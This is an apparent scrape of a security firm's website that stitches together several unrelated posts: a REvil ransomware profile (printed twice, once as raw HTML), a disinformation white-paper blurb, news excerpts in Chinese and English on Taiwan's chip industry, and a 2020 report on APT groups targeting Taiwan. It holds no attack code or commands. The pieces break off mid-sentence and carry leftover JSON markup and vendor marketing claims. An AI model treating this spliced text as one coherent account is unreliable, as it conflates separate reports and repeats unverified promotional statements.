In March 2021, another REvil&#x27;s attack was announced. Targeting the computer giant Acer, the actors behind the ransomware asked for 50 million dollars, the highest ransom they have demanded so far. Acer was not the only victim of the notorious ransomware. Debuted in April 2019, REvil has attacked hundreds of high-profile agencies in multiple sectors. In 2020, REvil has earned more than 100 million.[1] In this report, we will introduce the basic profile of REvil and share the techniques they used in operations. 


## What is REvil 

REvil, a.k.a Sodinokibi, is a Ransomware as a Service (RaaS) operation deployed by a Russian cybercrime group named GOLD SOUTHFIELD or Pinchy Spider. The group is believed to be based in Russia, as it does not attack organizations in Post-Soviet States, and refuse to cooperate with English speaking cyber criminals.[2] 

REvil was highly possible the successor of GandCrab, another notorious ransomware, because of code similarities and REvil&#x27;s active operations right after GandCrab&#x27;s retirement.[3]

&lt;br&gt;

Numerous campaigns attacking multiple sectors were observed all over the world. The REvil actors has attacked local governments, giant law firms, multinational retailers, etc. The highest ransom they have asked was 42 million for the law firm but was now surpassed by the 50 million Acer attack.

&lt;br&gt;

## The Ransomware as a Service model (RaaS)

The actors of REvil adopt the Ransomware as a Service business model. In this model, Ransomware developers are responsible for development and maintenance of the ransomware, while the groups of cyber criminals, named affiliates in this model, are responsible for accessing victims&#x27; system to distribute the ransomware. The business model allows cyber criminals who are not capable of developing their own ransomware to buy the service on dark web and deploy ransomware attack. 
 
Through this model, REvil actors provide REvil or the customized version of REvil to their affiliates. After they successfully breached victims&#x27; systems, REvil actors will ask for ransom by themselves, providing the ransom payment link. After the collection of money, their affiliates will receive 60% to 75% of the profit. Moreover, the actors also provide other paid services, such as money laundering assistance for the affiliates.

&lt;br&gt;

## Tactic, Techniques and Procedures
### Initial Access
For REvil, different affiliates may use different methods for initial access. The ransomware is now distributed primarily through compromised RDP sessions (65%), phishing (16%), and software vulnerabilities (8%).[5] However, a supply chain attack distributing REvil was also observed.

REvils&#x27; actors said in an interview that they used brute force attacks to compromise RDP sessions.[1] As for phishing emails, the cyber criminals have once disguised their email as a new booking from &quot;booking.com&quot;. They also exploit vulnerabilities. In fact, REvil&#x27;s debut was exploiting the Oracle Weblogic vulnerability, CVE-2019-2725. Moreover, the actors are able to deploy new vulnerabilities after its disclosure. For example, the group used the recent disclosed Microsoft Exchange server vulnerability to access Acer&#x27;s system.

The most astounding technique they deployed is supply chain attack. Around June 2019, a WINRAR distributor site in Italy was hacked.[6][7] The software downloaded from the site at that time was not the WINRAR installer but the REvil installer. Although no public announcements showing that any company was infected in this attack, the successful replacement shows that their affiliates were able to deploy a supply chain attack. 

Apart from their various method on initial access, the cyber criminals also adopted several unique techniques. For example, REvil used Elliptic-curve Diffie-Hellman key exchange to encrypt files, while other ransomware often used RSA, Salsa20 or AES to do so. This method is more efficient as it used shorter key and is difficult to decrypt. 

&lt;br&gt;

## The Effective Methods for Ransom Collection
Nowadays, as ransomware attacks become a serious problem, most companies have learned to back up crucial data in case they are hit by a ransomware. However, ransomware actors develop several new methods to ensure that the victims will pay the ransom, including Double-extortion, VoIP calling, and DDoS attack.

- &quot;Double-extortion&quot;
The actors disclose or sell the data of the company if the company is not willing to pay ransom. This method was first introduced by Maze, another notorious ransomware, and currently almost all ransomware actors have adopted this method, and so as REvil. Starting from January 2020, the group runs their own site &quot;Happy Blog&quot;, where they post data extorted from their victims.

- Voice over Internet Protocol (VoIP) calling
In February 2021, they announced that they are now offering Voice over Internet Protocol (VoIP) calling and DDoS attack service for their affiliates to make pressure on their victims.[8] They stated that they will call the media or their victims&#x27; business partners, telling them about the attack. 

&lt;br&gt;

## Detect and Defense
For prevention, it is always crucial to be aware of spamming emails. Nowadays, spamming emails is still the most popular and effective method to access victims&#x27; computers. 

In addition, keep an eye on new exploits and updates is also important. Ransomware groups usually are not capable of discovering 0-day exploits by themselves, but they will exploit the disclosed vulnerabilities and attack those who have not updated their system. Thus, keep computers updated and patched systems immediately after the disclosure is essential for preventing ransomware attack.

Furthermore, as the REvil business grows, the actors behind has posted on dark web to recruit more affiliates for their operations. Thus, more attacks from the group is expected. TeamT5 will keep following the ransomware and provide up-to-date information of the notorious ransomware.

To efficiently prevent ransomware attacks, TeamT5 offers a total solution for enterprise protection. Our unique ransomware containment technology is proven to successfully block many types of ransomware, which can detect and stop malicious ransomware immediately. And even restore encrypted files from the backup.

courtesy of <a href="https://pixabay.com/illustrations/security-hacker-web-security-data-5614016/">Pixabay</a></p><p>In March 2021, another REvil&#x27;s attack was announced. Targeting the computer giant Acer, the actors behind the ransomware asked for 50 million dollars, the highest ransom they have demanded so far. Acer was not the only victim of the notorious ransomware. Debuted in April 2019, REvil has attacked hundreds of high-profile agencies in multiple sectors. In 2020, REvil has earned more than 100 million.[1] In this report, we will introduce the basic profile of REvil and share the techniques they used in operations. </p><h2 id="what-is-revil-">What is REvil </h2><p>REvil, a.k.a Sodinokibi, is a Ransomware as a Service (RaaS) operation deployed by a Russian cybercrime group named GOLD SOUTHFIELD or Pinchy Spider. The group is believed to be based in Russia, as it does not attack organizations in Post-Soviet States, and refuse to cooperate with English speaking cyber criminals.[2] </p><p>REvil was highly possible the successor of GandCrab, another notorious ransomware, because of code similarities and REvil&#x27;s active operations right after GandCrab&#x27;s retirement.[3]</p><p><img alt="REvil_1.png" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845336/R_Evil_1_035a848033.png" class="css-1h5x3dy"/>

<em>Figure 3: REvil and GandCrab&#x27;s similarity on building ransom wallpaper</em></p><br/><p>Numerous campaigns attacking multiple sectors were observed all over the world. The REvil actors has attacked local governments, giant law firms, multinational retailers, etc. The highest ransom they have asked was 42 million for the law firm but was now surpassed by the 50 million Acer attack. (References for the events, please see the end of this page.[4])</p><br/><p><img alt="REvil__4.jpeg" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845337/R_Evil_4_56bc894487.jpg" class="css-1h5x3dy"/>
<em>Figure 4: The timeline of REvil&#x27;s notorious attacks</em></p><br/><h2 id="the-ransomware-as-a-service-model-raas">The Ransomware as a Service model (RaaS)</h2><p>The actors of REvil adopt the Ransomware as a Service business model. In this model, Ransomware developers are responsible for development and maintenance of the ransomware, while the groups of cyber criminals, named affiliates in this model, are responsible for accessing victims&#x27; system to distribute the ransomware. The business model allows cyber criminals who are not capable of developing their own ransomware to buy the service on dark web and deploy ransomware attack. </p><p>Through this model, REvil actors provide REvil or the customized version of REvil to their affiliates. After they successfully breached victims&#x27; systems, REvil actors will ask for ransom by themselves, providing the ransom payment link. After the collection of money, their affiliates will receive 60% to 75% of the profit. Moreover, the actors also provide other paid services, such as money laundering assistance for the affiliates. </p><p><img alt="May_blog_3.jpeg" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1620634812/May_blog_3_71c24e74f2.jpg" class="css-1h5x3dy"/></p><br/><h2 id="tactic-techniques-and-procedures">Tactic, Techniques and Procedures</h2><h3 id="initial-access">Initial Access</h3><p>For REvil, different affiliates may use different methods for initial access. The ransomware is now distributed primarily through compromised RDP sessions (65%), phishing (16%), and software vulnerabilities (8%).[5] However, a supply chain attack distributing REvil was also observed.</p><p>REvils&#x27; actors said in an interview that they used brute force attacks to compromise RDP sessions.[1] As for phishing emails, the cyber criminals have once disguised their email as a new booking from &quot;booking.com&quot;. They also exploit vulnerabilities. In fact, REvil&#x27;s debut was exploiting the Oracle Weblogic vulnerability, CVE-2019-2725. Moreover, the actors are able to deploy new vulnerabilities after its disclosure. For example, the group used the recent disclosed Microsoft Exchange server vulnerability to access Acer&#x27;s system.</p><p>The most astounding technique they deployed is supply chain attack. Around June 2019, a WINRAR distributor site in Italy was hacked.<span>[6][7]</span> The software downloaded from the site at that time was not the WINRAR installer but the REvil installer. Although no public announcements showing that any company was infected in this attack, the successful replacement shows that their affiliates were able to deploy a supply chain attack. </p><p>Apart from their various method on initial access, the cyber criminals also adopted several unique techniques. For example, REvil used Elliptic-curve Diffie-Hellman key exchange to encrypt files, while other ransomware often used RSA, Salsa20 or AES to do so. This method is more efficient as it used shorter key and is difficult to decrypt. </p><br/><h2 id="the-effective-methods-for-ransom-collection">The Effective Methods for Ransom Collection</h2><p>Nowadays, as ransomware attacks become a serious problem, most companies have learned to back up crucial data in case they are hit by a ransomware. However, ransomware actors develop several new methods to ensure that the victims will pay the ransom, including Double-extortion, VoIP calling, and DDoS attack.</p><ul><li><div><p>&quot;Double-extortion&quot;
The actors disclose or sell the data of the company if the company is not willing to pay ransom. This method was first introduced by Maze, another notorious ransomware, and currently almost all ransomware actors have adopted this method, and so as REvil. Starting from January 2020, the group runs their own site &quot;Happy Blog&quot;, where they post data extorted from their victims.</p></div></li><li><div><p>Voice over Internet Protocol (VoIP) calling
In February 2021, they announced that they are now offering Voice over Internet Protocol (VoIP) calling and DDoS attack service for their affiliates to make pressure on their victims.[8] They stated that they will call the media or their victims&#x27; business partners, telling them about the attack.</p></div></li></ul><br/><h2 id="detect-and-defense">Detect and Defense</h2><p>For prevention, it is always crucial to be aware of spamming emails. Nowadays, spamming emails is still the most popular and effective method to access victims&#x27; computers. </p><p>In addition, keep an eye on new exploits and updates is also important. Ransomware groups usually are not capable of discovering 0-day exploits by themselves, but they will exploit the disclosed vulnerabilities and attack those who have not updated their system. Thus, keep computers updated and patched systems immediately after the disclosure is essential for preventing ransomware attack.</p><p>Furthermore, as the REvil business grows, the actors behind has posted on dark web to recruit more affiliates for their operations. Thus, more attacks from the group is expected. TeamT5 will keep following the ransomware and provide up-to-date information of the notorious ransomware.</p><p>To efficiently prevent ransomware attacks, TeamT5 offers a total solution for enterprise protection. Our unique ransomware containment technology is proven to successfully block many types of ransomware, which can detect and stop malicious ransomware immediately. And even restore encrypted files from the backup.</p><p>For more information about TeamT5 Ransomware Prevention total solution, please contact: <a

From the 2018 municipal elections to the 2020 general elections, Taiwan has witnessed the growing threat of disinformation to the citizens. It was observed that many malicious actors utilized social media to disseminate a huge amount of fake news, false information, and hate speech. These disinformation are like highly contagious viruses that will not only affect the people consuming them, but also make them secondary disseminators. We assess that:\n\n1. Virus-like disinformation makes everyone on social media both victim and disseminator\n\n   Although public discussion is the cornerstone of a good democratic society, many attacks have used voter enthusiasm to spread on social media. We have observed that many of the voters who participated in the discussion turned out to be the source of dissemination.\n2. Disinformation continues to evolve in tactics and quantity, as well as expanding its targets\n\n   The Taiwanese Central Election Commission (CEC) stated that the number of disinformation cases before the 2020 elections reached an unprecedented level. In addition to the evolution in quantity and tactics, we observed that the dissemination of disinformation did not stop even after the election, but instead shifted the target.\n3. China continues to increase its influence\n\n   Apart from news agency promoting the Chinese policies, inauthentic accounts run by bot, and patriotic netizens (A.K.A little pink), China has stepped up its influence on social media platforms to shape narratives.\n4. Information operations are outsourced, layer-by-layer\n\n   Before the elections, a number of marketing firms and new media were established to spread political messages. We discovered that some of them have connections with certain political parties, implying the layer-by-layer outsourcing of Information Operations by politically motivated actors.\n\nFrom the perspective of security researchers, we integrated the Information Operations intercepted and investigated by TeamT5 over the past two years, hoping to contribute to the next democratic election.\n\nIf you are interested in this white paper, please fill out the form, and we will send you the report by email.\n\nCOMING UP NEXT: We will publish reports about how China conduct Information Operation on social media platforms, targeting domestic citizens and foreign audiences.

日以「[全球危險地依賴台灣半導體](https://www.bloomberg.com/news/features/2021-01-25/the-world-is-dangerously-dependent-on-taiwan-for-semiconductors)」為題解析此現象，指出這不僅凸顯台積電在全球供應鏈的重要性及位階，也意味著各國政府領導人非常需要台灣維持民主、不被中國進犯，否則地緣政治紛擾將成為晶片供應瓶頸。\n\n柏林智庫「新責任基金會」（Stiftung Neue Verantwortung）科技與地緣政治專案主任克萊恩漢斯（Jan-Peter Kleinhans）表示，台灣主宰了美國委外晶片製造市場，因此是整個半導體價值產業鏈最重要的潛在關鍵，一旦台灣失效，就會讓整個產業鏈無法運作。\n\n#### 台灣的晶片技術，能抵禦中國進犯？\n\n為應對中國的晶片短缺危機，中國國家主席習近平去年 10 月公布，計畫在 2025 年以前砸下 1.4 兆美元（約新台幣 39 兆元）發展國內半導體產業。然而即使這麼做，也不能完全消除中國對台灣的晶片需求。中國長期不斷挖腳製造晶片的高科技人才，曾是台積電主要高層的梁孟松、蔣尚義，如今是中國中芯國際的共同執行長和副董事長。\n\n有鑑於美國阻礙中國發展晶片，有人猜測北京可能會竊取台灣的晶片智慧財產權技術。台灣網絡安全公司杜浦數位安全（TeamT5）觀察到，美中技術冷戰期間，台灣晶片產業受到的網路攻擊也跟著增加，但無法辨認攻擊是否都由中國當局主使，只能確定這些駭客攻擊的受害者全都是台灣半導體公司。\n\n[點此閱讀完整報導](https://www.storm.mg/article/3426084?mode=whole)\n\n\u003cbr\u003e","title":"【風傳媒】晶片大缺貨，美德日向台灣求援　彭博社：全球對台依賴達到「危險」地步","__v":0,"id":"6010de5ec56e80003f985987"},{"locale":"en","_id":"6010ed3ac56e80003f9859ae","title":"【Bloomberg】The

supply chain\n\nAs China pushes the world to avoid official dealings with Taiwan, leaders across the globe are realizing just how dependent they’ve become on the island democracy.\n\nTaiwan, which China regards as a province, is being courted for its capacity to make leading-edge computer chips. That’s mostly down to Taiwan Semiconductor Manufacturing Co., the world’s largest foundry and go-to producer of chips for Apple Inc. smartphones, artificial intelligence and high-performance computing.\n\n#### Chip Industry Choke Points\nThe industry’s biggest companies are siloed in just a few countries.\n\n\n“TSMC is becoming more and more dominant,” said Kazumi Nishikawa, an official working on technology issues at Japan’s Economy Ministry. “This is something everybody in the chip industry must find a way to deal with.”\n\nChina, in its five-year plan presented in October, is channeling help to the chip industry and other key technologies to the tune of $1.4 trillion through 2025. Yet even that kind of money doesn’t negate the need for Taiwan. Indeed, China has long tapped the island for chip-making talent; two key executives at China’s top chipmaker, Semiconductor Manufacturing International Corp., used to work at TSMC: co-Chief Executive Officer Liang Mong Song and Vice Chairman Chiang Shang-yi.\n\nBut with Washington stymieing China’s progress, there is also speculation that Beijing could resort to stealing chip IP, with Taiwan at the heart of those endeavors.\n\nTaiwanese cyber security firm TeamT5 has observed a steady increase in attacks on the island’s chip industry corresponding to the tightening of U.S. export controls on China. While it’s not always possible to know if these are Chinese state actors, “they are all attacking the Taiwanese semiconductor industry,” Shui Lee, a T5 cyber threat analyst, said.\n\nFellow analyst

年被公認為充滿混亂與災禍的一年。各式各樣的大事件諸如新冠肺炎、中亞東歐台海等地的地緣政治衝突、英國脫歐、美國總統大選都將世界各地的人們帶向跟過去截然不同的生活。TeamT5 在過去一年中持續幫助受到國家力量支持的針對性攻擊行動（或稱 APT 攻擊）所受害的單位。同時間 TeamT5 的威脅情資團隊也主動追蹤 APT 攻擊者的各類行蹤。跟真實世界相比較，網路世界的混亂情況並不亞於我們於現實世界所見，同時網路世界的衝突有很大一部份是真實世界的映射或延伸。本篇文章將探討 TeamT5 在 2020 年所觀察到的台灣威脅態勢。\n\n在本篇文章中，我們首先會為您介紹我們在 2020 年所觀察到的重大趨勢，包含了：\n\n- APT 攻擊的演進，網路間諜不再是唯一的攻擊手段\n- 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n- 由新冠肺炎所引發的網路攻擊\n\n接著我們會針對所觀察到的攻擊行動進行分析，試圖以產業別以及攻擊族群視角來進行網路威脅情資的剖析。文章的最後則是我們對如何應對網路攻擊不斷變化的建議作為總結。\n\n\u003cbr\u003e\n\n### 網路間諜不再是唯一的攻擊手段\n\n2020 年所公開的網路攻擊中，影響最深遠的當數中國 APT 攻擊者於五月時針對多個能源產業公司所進行的勒索軟體攻擊 [1]。TeamT5 研究顯示，這是一個來自中國惡名昭彰的 APT 攻擊族群，規畫已久的攻擊行動。這個行動究竟是攻擊者單純以獲取金錢為目的所發起的勒索行動，抑或是以勒索軟體為掩護的政治嚇阻行動（時值 520 台灣總統上任前），背後的答案依舊成謎。無論如何，本次的攻擊行為已為中國對台 APT 攻擊行動劃下新的里程碑：中國 APT 已針對台灣進行二十年以上的攻擊，但行動範圍都維持在竊取機密為目的而進行的網路間諜行動，這次攻擊意味著攻擊者將開始採用更多元的戰術來對台灣進行網路打擊行動。\n\n另一個發生在 PTT BBS 論壇上的攻擊行動可以佐證我們的臆測：在 2020 年七月，TeamT5 追蹤了一連串的 BBS 爆料貼文，試圖詆毀台灣政府與軍方的形象，攻擊者使用了多個境外跳板 IP 位址來試圖隱藏他們的來源，然而 TeamT5 的情資資料庫顯示，其中一個來源 IP 曾被某個鎖定台灣已久的 APT 攻擊族群所使用；無獨有偶，我們也獲得某訊息來源指出，該 APT 族群正是隱身在此次行動背後的攻擊者。我們相信這兩個事件正是一個警訊，告訴我們中國 APT 族群正在嘗試各種過去沒使用過的手法來做更多樣性的攻擊行動。\n\n\u003cbr\u003e\n\n### 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n\nTeamT5 曾在過去示警過供應鏈攻擊手法的危險性 [2]，研究顯示它在 2020 年已經成為 APT 攻擊的一種主要入侵手法之一：2020 年十二月被揭露的 SolarWinds/SUNBURST 攻擊行動無疑是當前最成功的案例之一，受害目標包含了許多美國高層政府部門，全球前五百大公司，甚至數個資安廠商本身也在本次攻擊中被攻擊者攻陷，它的手法精細而行動縝密，以致於目前仍無法掌握整個攻擊全貌。在台灣，TeamT5 也觀察到至少三波的攻擊行動使用了類似的手法：攻擊者先針對服務供應商進行滲透，再進一步利用供應商的產品或服務當跳板來直接進入終端用戶，包含政府部門或其他各產業的公司。前兩波的攻擊行動已於八月間被法務部調查局所公開揭露 [3]，而第三波攻擊行動仍在調查中。我們目前已觀察到數十家甚至上百的台灣公私單位被這些行動所成功滲透，而且至少有三個來自中國的 APT 族群參與其中。\n\n\u003cbr\u003e\n\n### 由新冠肺炎所引發的網路攻擊\n\n第三個攻擊趨勢則為新冠肺炎所趨使的網路攻擊行動。隨著新冠肺炎疫情爆發數週內，TeamT5 就觀察到有國家支持的網路攻擊者開始疫情相關的情報蒐集；隨著時序進入下半年，攻擊者的目標開始轉向疫苗發展資訊的蒐集，可以看出網路攻擊行動隨著現實世界改變的趨勢。在台灣，TeamT5 也分析了數個以新冠疫情為主題所進行的攻擊行動，甚至有數波針對醫療相關部門的針對性攻擊行動。我們相信只要疫情尚未消散的一天，相關的攻擊行動就會持續進行。\n\nTeamT5 威脅情資團隊在 2020 年分析了近百個來自中國的 APT 攻擊。統計結果顯示，政府和軍方部門仍為最大的攻擊目標，相對應的攻擊事件超過了總數的四分之一，幾乎每個在台灣地區有活動的 APT 族群都會嘗試攻擊相關部門，主要的原因在於 APT 的主要目標是獲取國家相關的機密情資。值得注意的是，針對資訊產業的攻擊在 2020 年躍升為第二大，顯示 APT 攻擊對資訊公司的高度興趣，主要的原因應與前述的供應鏈攻擊趨勢有關：這些資訊產業公司往往同時服務許多客戶並橫跨不同部門產業，攻陷這些資訊公司提供攻擊者一個絕佳的跳板來進一步滲透終端客戶。\n\n能源產業是 2020 年被針對的第三大產業，TeamT5 觀察到至少有五個族群針對能源產業鏈中的多個部門進行滲透，我們認為這是一個徵兆，顯示敵人試圖控制台灣關鍵基礎設施的野心，因為這些部門在戰爭時期將會成為優先被癱瘓的目標。教育和智庫單位長久以來也名列 APT 攻擊目標排行榜中，相對應的攻擊數量在 2020 年位居第四名，主要的原因在於這些單位中的研究人員往往參與了政府的研究計畫或是政策制定。半導體產業是我們觀察到第五大被針對的目標，由於中國官方將半導體明定為十三五和十四五計畫中重點扶植的產業，這些攻擊應為有計劃性的網路間諜活動，目的在於竊取台灣相關的智慧財權或產業機密。醫療和運輸產業也是兩個在 2020 年被中國 APT 重點性針對的目標產業，如同前述，我們相信新冠肺炎可能是一個趨使攻擊者針對醫療產業的主要因素；交通相關產業部份，TeamT5 觀察到一個值得注意的現象：有一個我們稱為 GouShe（亦稱為 TroppicTropper、Keyboy）的 APT 族群特別針對台灣的交通運輸相關部門進行滲透，2020 年間的相關攻擊事件有七成以上均來自該族群。\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 年 APT 攻擊目標產業分佈_\n\n\u003cbr\u003e\n\nTeamT5 於 2020 年間共追蹤了至少九個 APT 族群的攻擊行動，當中有八個是來自中國。HUAPI（亦稱為 BlackTech、PLEAD）是所有族群中最具野心的一群，他們的攻擊行動佔了我們所觀察到總數近三成，而且攻擊目標幾乎涵蓋了上述的所有產業。我們在前面所提到的台灣供應鏈攻擊行動他們也都有參與。APT27（亦稱 EmissaryPanda、IronTiger、LuckyMouse、BronzeUnion）、GouShe 和 AMOEBA（亦稱 APT41、Barium、Winnti）也是在 2020 年攻擊台灣的數個主要攻擊來源族群：據 TeamT5 研究，APT27 主要攻擊政府、醫療和金融相關單位和產業。GouShe 近一、兩年的攻擊行動，展現了針對交通運輸部門和產業的高度興趣，同時我們也在能源和政府單位觀察到他們的蹤跡，TeamT5 針對此族群追蹤了近十年，研究結果顯示該族群可能接受所屬單位指令來監控台灣的關鍵基礎設施，並可能在關鍵時刻針對這些單位進行控制和接管。\n\nAMOEBA 在過去一年間主要攻擊目標包含了能源、半導體產業，教育智庫單位和資訊產業，從攻擊目標推斷，他們的主要目的偏向於智財和產業機密竊取，但我們不排除攻擊者會嘗試利用攻擊獲取成果進行二次利用，如同他們在五月間所進行的勒索攻擊行動一樣。SLIME1、SLIME9、SLIME13 是 TeamT5 對三個中國 APT 攻擊行動的暫時行動代稱，我們在近幾年都有持續觀察到他們的行動。Polaris（亦稱 MustangPanda）則是一個針對幾乎中國鄰近國家的 APT 族群，我們在三、四月間發現有多個來自他們的釣魚信件針對台灣政府和研究單位進行攻擊，我們推測他們試圖蒐集新冠肺炎相關疫情資訊。最後，我們在台灣也有發現一個由北韓 APT 族群 Lazarus 所使用的 Linux 後門工具，但沒有進一步資訊可以確認受害者身份資訊，雖然台灣在政治上並非北韓 APT 的主要攻擊目標，但由於 Lazarus 族群被公認肩負為北韓政府籌措財源的責任，舉例來說，2017 年發生在台灣銀行的 SWIFT 系統攻擊事件就是由 Lazarus 所為，此樣本也許是一個顯示 Lazarus 仍持續在台灣地區有活動跡象的警訊。\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_2020 年間攻擊台灣的 APT 族群_\n\n\u003cbr\u003e\n\n### 結語\n\nTeamT5

Li**\n\n2020 was considered to be a year of chaos and disaster. Big events such as the outbreak of COVID-19, geopolitical conflicts escalations in several areas, Brexit, and the U.S. president election, all influenced people around the world. In 2020, TeamT5 continued helping numerous security breaches caused by state sponsored targeted instruction attacks (APT) . In the meantime, TeamT5 intelligence Team proactively tracked APT actors’ new activities. Compared with real world, the cyber world was also full of turmoil in 2020 and many of them are reflections or extensions to events in real world. In this article, we will discuss our observation of APT trends in Taiwan in 2020.\n\nIn this article, we will first walk you through some remarkable trends, including:\n\n- Evolution of APT tactic\n- Supply Chain attack became a primary method in APT attacks\n- COVID-19 driven cyber attacks\n\nWe will try to dissect the attacks happened in Taiwan in industrial view and adversarial view, which is a common method in threat intelligence analysis. Last part will be our conclusion and suggestions to respond with APT attacks.\n\n\u003cbr\u003e\n\n### Evolution of APT tactic\n\nIn 2020, the most notable APT event in public would be the ransom-attack that strike several energy related companies in May [1]. TeamT5 research shows it to be a well-organized campaign from a notorious Chinese adversary group. Whether financial gain or political deterrence is the real motivation behind the ransom-attack remains a mystery. However, it has marked a milestone of China’s cyber-attacks against Taiwan: Chinese APT have aimed Taiwan for more than 20 years but only limited in cyber espionage operations in the past but the threat actors are now exercising new tactics to evade us.\n\nAnother cyber-attack supporting our hypothesis occurred on PTT, the most popular BBS platform in Taiwan. TeamT5 tracked a series of posts related to some scandals, with attempts to uglify Taiwanese governments or military, on PTT in July 2020. The actors abused hopping servers from various countries to hide their footprints. However, TeamT5 intelligence database shows that one of the source IP address was also used by a Chinese APT that has targeted Taiwan for more than ten years. Besides, another private source also verified the same APT group to be the culprit behind the attack.  We consider both events to be indicators of China’s expansion on offensive cyber operations, which we have not observed in the past.\n\n\u003cbr\u003e\n\n### Supply Chain attack becoming a primary method in APT attacks\n\nSupply chain attack has become a major intrusion method for threat actors in 2020 and TeamT5 had warned such tactic in advance [2]. SolarWinds breach was undoubtedly the most successful story among them. Many high-profile US government agencies, Fortune 500 companies and even cybersecurity vendors were affected. It is so sophisticated that the scope is still uncertain yet. In Taiwan, we also observed at least three waves of similar attacks that infiltrated service providers and further leveraged their products or services to infect more victims. The first two had been published by the Ministry of Justice Bureau (MJIB) of Taiwan in August [3]. The third was still under investigation and the impact could be even bigger. We have seen a significant numbers of government agencies or private corporates in Taiwan being compromised. TeamT5 research shows that at least 3 distinct China nexus group were involved in these operations.\n\n\u003cbr\u003e\n\n### COVID-19 driven cyber attacks\n\nAnother interesting phenomenon would be COVID-19 related cyber-attacks. Soon after the outbreak of COVID-19 pandemic, we observed state sponsored actors collecting intelligence for the pandemic. In the second half of 2020, threat actors shifted their focus to chasing COVID-19 vaccine information with the advance of COVID-19 vaccine development. In Taiwan, TeamT5 also intercepted several spear phishing emails using COVID-19 as lure theme or even more campaigns related to healthcare related entities. We believe the trend will continue as long as the COVID-19 pandemic still exists.\n\nTeamT5 Intelligence Team had analyzed around one hundred APT attacks from China in 2020. Our statistic shows government and military agencies are still the biggest target and attacks against them counts for more than 1/4 in total and almost every APT groups that are active in Taiwan are coveting them. This trend has lasted for long since the ultimate goal of Chinese espionage operation is to obtain confidential national information. Information Technology (IT) industry also got attention a lot by APT actors and TeamT5 has observed a dramatical increase of attacks against IT industry. We believe this phenomenon is a result of threat actors’ attempts to abuse supply chain attacks and IT companies are considered to be good hopping points by actors to access various industries.\n\nThe third industry being targeted in 2020 is Energy industry and TeamT5 had observed at least attacks from 5 adversary groups. It could be a sign of our adversaries’ ambitions to control our critical industries because they will be top priorities of sabotages in wartime. Education or think tanks have been long ranked as the most attacked victims because they tend to involve in classified research projects hosted by governments or political decision makings. There were several targeted attacks against companies in semiconductor industries. It makes sense since Semiconductor industry is listed as a priority to be fostered by Chinese authority in their thirteen and fourteen Five-Year projects. Cyber espionage was also adopted as a mean to improve their techniques. Healthcare and transportation are also two industries that got coveted by APT actors. As we mentioned in the previous paragraph, COVID-19 could be an incentive for APT actors to attack Healthcare industries. Lastly, we would like to raise a phenomenon TeamT5 observed: There was an adversary group which we called GouShe (a.k.a TroppicTropper, Keyboy) focus on infiltrating Transportation related entities in Taiwan. More than 70% of transportation related cases we observed were from this specific group.\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 APT target industries distribution_\n\n\u003cbr\u003e\n\nTeamT5 has tracked activities from at least 9 APT groups and 8 of them are from China. HUAPI (a.k.a BlackTech/PLEAD) was definitely the most ambitious group in Taiwan. Their attacks counts around 30% of incidents we analyzed and the targeting scope includes almost all the industries we listed. The supply chain attacks we mentioned in previous paragraphs were also conducted by them. APT27 (a.k.a EmissaryPanda, IronTiger, LuckyMouse, BronzeUnion), GouShe and AMOEBA (a.k.a APT41, Barium, Winnti) are groups that are quite active in 2020. APT27 was mostly attacking government, healthcare, and financial entities. GouShe showed a peculiar interest in transportation related entities while their footprints are also observed in energy and government entities. TeamT5 has tracked this group for many years. Our research shows that the actors might bear some responsibility from their higher commands to monitor some critical infrastructure facilities in Taiwan and take control of them in case of emergency status.\n\nAMOEBA attacked energy companies, semiconductor companies, educational institutes, and IT companies. Their primary goal appears to be more for intellectual property or secret theft. But the possibilities exist that the actor might further leverage their achievement, like what they did in the ransom-attack in May. SLIME1, SLIME9 and SLIME13 are temporary code names for three Chinese APT campaigns against Taiwan that have lasted for a few years. Their activities still continued in 2020. Polaris (a.k.a MustangPanda) is another Chinese APT group that attacked almost all neighboring countries of China. We intercepted several of their spear phishing emails against government and research institutes in early stage of COVID-19 and we surmise they were gathering for information related to pandemic. One last interesting discovery: we discovered some Linux based malware used by Lazarus, a notorious North Korean APT group, circulated in Taiwan but we are unable to obtain the victim identity information. Although Taiwan is not a primary target of North Korean APT. But the Lazarus actors are believed to bear financial supporting responsibilities for their government agencies. For example, Lazarus is believed to be the culprit behind a Taiwanese bank SWIFT heist in 2017 [4]. The sample we uncovered might suggest their activities still exist in Taiwan.\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_Adversaries attacking Taiwan in 2020_\n\n\u003cbr\u003e\n\n### Conclusion\n\nThe purpose of this article is to provide a high-level overview of APT threat landscape of Taiwan in 2020, since TeamT5 believes knowing your enemy is the first step of effective defense. TeamT5 research shows that APT attacks keep evolving to become very complex and impossible for a security product to defend.

White Paper III: China’s Social Manipulation outside the Great Firewall","context":"In the final part of our Information Operation White Paper, we will demonstrate China's Information Operations (InfoOps) targeting the global audience. The first part of the report displays a brief overview of its overt operations which are carried out by state media, embassies, and diplomats. Then we look into the covert operations, which can be observed in pro-China fan pages, content farms, and spam botnet. Last but not least, we provide the case study of \"Operation Juiker\" on Taiwan's largest forum PTT, which suggests the possibility of the APT (Advanced Persistent Threat) actors entering the threat landscape.\n\n#### Key Takeaways\n\n1. China has escalated the level of overt InfoOps via state-media and diplomats.\n\u003cbr\u003e\n\u003cbr\u003e\nChinese state media, diplomats, and embassies are the main actors of Chinese overt InfoOps. They shoulder the task to polish the image of the regime and propagate the narrative of the Chinese Communist Party (CCP). It is noteworthy that their official accounts have obtained an unexpected number of followers in recent years. For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook. Their main audience, apart from the Chinese citizens, are overseas Chinese diaspora, which many of them have rights to vote in countries such as the U.S., Canada, and Australia, thus having the ability to influence a country's politics.\n\u003cbr\u003e\n\u003cbr\u003e\n2. Covert InfoOps remain active on Western social media platforms.\n\u003cbr\u003e\n\u003cbr\u003e\n2020 is a year which has set many records. This year, the takedowns of covert Chinese social media accounts by Facebook, Twitter, and Google are 